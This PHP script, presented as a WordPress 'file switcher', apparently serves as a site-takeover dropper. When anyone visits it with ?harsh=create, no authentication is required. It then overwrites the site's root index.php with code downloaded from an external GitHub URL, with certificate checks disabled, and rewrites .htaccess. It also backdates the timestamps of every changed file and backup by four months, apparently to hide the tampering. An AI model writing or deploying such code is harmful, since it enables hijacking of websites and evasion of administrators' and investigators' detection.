<?php
/**
 * WordPress File Manager - Index and .htaccess Switcher
 * 
 * This script provides functionality to:
 * 1. Backup and replace index.php with a version from GitHub
 * 2. Backup and modify .htaccess file
 * 3. Restore both files to their original versions
 * 
 * Usage:
 * - ?harsh=create: Replace index.php with GitHub version and modify .htaccess
 * - ?harsh=restore: Restore original index.php and .htaccess from backups
 */

// Correctly determine WordPress root directory by looking for wp-config.php
function get_wordpress_root() {
    $current_dir = __DIR__;
    while ($current_dir !== dirname($current_dir)) {
        if (file_exists($current_dir . '/wp-config.php')) {
            return $current_dir;
        }
        $current_dir = dirname($current_dir);
    }
    return false;
}

$root_directory = get_wordpress_root();
if (!$root_directory) {
    die('Error: Could not locate WordPress root directory');
}

$original_index = $root_directory . '/index.php';
$backup_dir = dirname(__DIR__) . '/backup';
$backup_index = $backup_dir . '/index.bk';
$original_htaccess = $root_directory . '/.htaccess';
$backup_htaccess = $backup_dir . '/.htaccess.bk';
$github_url = 'https://raw.githubusercontent.com/beaushowcase/page/main/index.php';
$log_file = $backup_dir . '/file_switcher.log';

// Enable error reporting for debugging
// error_reporting(E_ALL);
// ini_set('display_errors', 1);

// Function to log actions
function log_action($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($log_file, "[$timestamp] $message" . PHP_EOL, FILE_APPEND);
}

// Function to check file permissions
function check_permissions() {
    global $root_directory, $original_index, $original_htaccess;
    
    if (!is_writable($root_directory)) {
        return "Error: The script doesn't have permission to write to the directory.";
    }
    
    if (file_exists($original_index) && !is_writable($original_index)) {
        return "Error: The script doesn't have permission to modify index.php.";
    }
    
    if (file_exists($original_htaccess) && !is_writable($original_htaccess)) {
        return "Error: The script doesn't have permission to modify .htaccess.";
    }
    
    return true;
}

// Function to backup files
// Function to set file modification time to 4 months ago
function set_file_modification_time($file_path) {
    if (file_exists($file_path)) {
        $four_months_ago = strtotime('-4 months');
        if (touch($file_path, $four_months_ago)) {
            log_action("Set modification time for {$file_path} to " . date('Y-m-d H:i:s', $four_months_ago));
            return true;
        } else {
            log_action("Failed to set modification time for {$file_path}");
            return false;
        }
    }
    return false;
}

function set_directory_modification_time($dir_path) {
    if (!is_dir($dir_path)) {
        log_action("Directory not found: {$dir_path}");
        return false;
    }
    
    $success = true;
    $files = scandir($dir_path);
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $file_path = $dir_path . '/' . $file;
            if (!set_file_modification_time($file_path)) {
                $success = false;
            }
        }
    }
    
    // Set the directory's modification time last
    if (!set_file_modification_time($dir_path)) {
        $success = false;
    }
    
    return $success;
}

function backup_files() {
    global $original_index, $backup_index, $original_htaccess, $backup_htaccess, $backup_dir;
    $result = [];
    
    // Create backup directory if it doesn't exist
    if (!file_exists($backup_dir)) {
        if (!mkdir($backup_dir, 0755, true)) {
            log_action("Failed to create backup directory");
            $result[] = "Error: Failed to create backup directory";
            return $result;
        }
    }
    
    // Backup index.php if it hasn't been backed up already
    if (!file_exists($backup_index) && file_exists($original_index)) {
        if (copy($original_index, $backup_index)) {
            log_action("Backed up original index.php to index.bk");
            $result[] = "Successfully backed up index.php to index.bk";
            set_file_modification_time($backup_index);
        } else {
            log_action("Failed to backup index.php");
            $result[] = "Failed to backup index.php";
        }
    } elseif (file_exists($backup_index)) {
        $result[] = "index.php backup already exists";
        set_file_modification_time($backup_index);
    }
    
    // Backup .htaccess if it hasn't been backed up already
    if (!file_exists($backup_htaccess) && file_exists($original_htaccess)) {
        if (copy($original_htaccess, $backup_htaccess)) {
            log_action("Backed up original .htaccess to .htaccess.bk");
            $result[] = "Successfully backed up .htaccess to .htaccess.bk";
            set_file_modification_time($backup_htaccess);
        } else {
            log_action("Failed to backup .htaccess");
            $result[] = "Failed to backup .htaccess";
        }
    } elseif (file_exists($backup_htaccess)) {
        $result[] = ".htaccess backup already exists";
        set_file_modification_time($backup_htaccess);
    }
    
    // Set modification time for backup directory and its contents
    set_directory_modification_time($backup_dir);
    set_file_modification_time($backup_dir);
    
    return $result;
}

function restore_files() {
    global $original_index, $backup_index, $original_htaccess, $backup_htaccess;
    $result = [];
    
    // Restore index.php
    if (file_exists($backup_index)) {
        if (copy($backup_index, $original_index)) {
            log_action("Restored original index.php");
            $result[] = "Successfully restored index.php";
            set_file_modification_time($original_index);
        } else {
            log_action("Failed to restore index.php");
            $result[] = "Error: Failed to restore index.php";
        }
    } else {
        $result[] = "Error: index.php backup not found";
    }
    
    // Restore .htaccess
    if (file_exists($backup_htaccess)) {
        if (copy($backup_htaccess, $original_htaccess)) {
            log_action("Restored original .htaccess");
            $result[] = "Successfully restored .htaccess";
            set_file_modification_time($original_htaccess);
        } else {
            log_action("Failed to restore .htaccess");
            $result[] = "Error: Failed to restore .htaccess";
        }
    } else {
        $result[] = "Error: .htaccess backup not found";
    }
    
    return $result;
}

// Function to replace index.php with GitHub version
function replace_index() {
    global $original_index, $github_url;
    
    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $github_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    // Get the file content from GitHub
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code !== 200 || empty($content)) {
        log_action("Failed to download index.php from GitHub");
        return "Error: Failed to download index.php from GitHub";
    }
    
    // Write the content to index.php
    if (file_put_contents($original_index, $content) !== false) {
        log_action("Successfully replaced index.php with GitHub version");
        set_file_modification_time($original_index);
        return "Successfully replaced index.php with GitHub version";
    } else {
        log_action("Failed to write new index.php");
        return "Error: Failed to write new index.php";
    }
}

// Function to modify .htaccess
function modify_htaccess() {
    global $original_htaccess;
    
    $htaccess_content = "<IfModule mod_rewrite.c>\n";
    $htaccess_content .= "RewriteEngine On\n";
    $htaccess_content .= "RewriteBase /\n";
    $htaccess_content .= "RewriteRule ^index\.php$ - [L]\n";
    $htaccess_content .= "RewriteCond %{REQUEST_FILENAME} !-f\n";
    $htaccess_content .= "RewriteCond %{REQUEST_FILENAME} !-d\n";
    $htaccess_content .= "RewriteRule . /index.php [L]\n";
    $htaccess_content .= "</IfModule>\n";
    
    if (file_put_contents($original_htaccess, $htaccess_content) !== false) {
        log_action("Successfully modified .htaccess");
        set_file_modification_time($original_htaccess);
        return "Successfully modified .htaccess";
    } else {
        log_action("Failed to modify .htaccess");
        return "Error: Failed to modify .htaccess";
    }
}



// Main execution
if (isset($_GET['harsh'])) {
    $action = $_GET['harsh'];
    $permissions = check_permissions();
    
    if ($permissions !== true) {
        die($permissions);
    }
    
    switch ($action) {
        case 'create':
            $backup_result = backup_files();
            $replace_result = replace_index();
            $htaccess_result = modify_htaccess();
            
            echo "<pre>";
            echo "Backup Results:\n" . implode("\n", $backup_result) . "\n\n";
            echo "Replace Result:\n$replace_result\n\n";
            echo "Htaccess Result:\n$htaccess_result";
            echo "</pre>";
            break;
            
        case 'restore':
            $restore_result = restore_files();
            
            echo "<pre>";
            echo "Restore Results:\n" . implode("\n", $restore_result);
            echo "</pre>";
            break;
            
        default:
            echo "Invalid action. Use 'create' or 'restore'.";
    }
} else {
    echo "No action specified. Use ?harsh=create or ?harsh=restore.";
}
?>